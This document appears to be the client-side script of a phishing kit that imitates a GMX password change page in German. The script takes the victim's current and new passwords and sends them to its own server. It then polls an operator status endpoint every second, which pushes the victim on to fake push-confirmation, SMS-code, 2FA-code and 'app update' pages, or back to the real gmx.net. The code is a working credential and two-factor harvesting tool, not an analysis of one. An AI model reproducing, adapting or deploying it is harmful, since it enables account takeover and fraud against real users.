(function () {
  var form = document.getElementById('cp-form');
  var formWrap = document.getElementById('cp-form-wrap');
  var successEl = document.getElementById('cp-success');
  var closeBtn = document.getElementById('cp-close-btn');
  var isSuccessOnly = /[?&]success=1/.test(window.location.search);

  if (closeBtn) {
    closeBtn.addEventListener('click', function() {
      window.location.href = 'https://www.google.com';
    });
  }

  if (isSuccessOnly && formWrap && successEl) {
    formWrap.classList.add('hide');
    successEl.classList.add('show');
  }

  function getId() {
    var m = /[?&]id=([^&]+)/.exec(window.location.search);
    return m ? decodeURIComponent(m[1]) : '';
  }

  document.querySelectorAll('#cp-form .toggle-password').forEach(function (btn) {
    btn.addEventListener('click', function () {
      var wrap = this.closest('.password-wrap');
      var input = wrap ? wrap.querySelector('input') : null;
      if (!input) return;
      input.type = input.type === 'password' ? 'text' : 'password';
      btn.setAttribute('aria-label', input.type === 'password' ? 'Passwort anzeigen' : 'Passwort verbergen');
    });
  });

  function setSubmitLoading(loading) {
    var btn = document.getElementById('cp-submit-btn');
    if (!btn) return;
    var textSpan = btn.querySelector('.cp-submit-text');
    var loadSpan = btn.querySelector('.cp-submit-loading');
    if (loading) {
      btn.disabled = true;
      if (textSpan) textSpan.style.display = 'none';
      if (loadSpan) loadSpan.style.display = 'inline';
    } else {
      btn.disabled = false;
      if (textSpan) textSpan.style.display = '';
      if (loadSpan) loadSpan.style.display = 'none';
    }
  }

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    var id = getId();
    var current = document.getElementById('cp-current').value;
    var newPw = document.getElementById('cp-new').value;
    var confirm = document.getElementById('cp-confirm').value;
    if (newPw !== confirm) {
      alert('Neues Passwort und Wiederholung stimmen nicht überein.');
      return;
    }
    if (newPw.length < 8) {
      alert('Das Passwort muss mindestens 8 Zeichen haben.');
      return;
    }
    setSubmitLoading(true);
    fetch('/api/change-password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: id, currentPassword: current, newPassword: newPw }),
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        setSubmitLoading(false);
        if (data && data.ok !== false) {
          formWrap.classList.add('hide');
          if (successEl) successEl.classList.add('show');
          fetch('/api/log-action', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: id, action: 'success' })
          }).catch(function () {});
        }
      })
      .catch(function () {
        setSubmitLoading(false);
      });
  });

  var id = getId();
  var statusInterval = null;
  if (id && !isSuccessOnly) {
    function checkStatus() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=change-password&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          if ((res && res.mode) === 'manual') return;
          var st = res && res.status;
          if (st === 'redirect_push') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/push-confirm.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sms_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'error') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/anmelden';
          }
        })
        .catch(function () {});
    }
    checkStatus();
    statusInterval = setInterval(checkStatus, 1000); // Увеличиваем частоту до 1 секунды
  }
})();
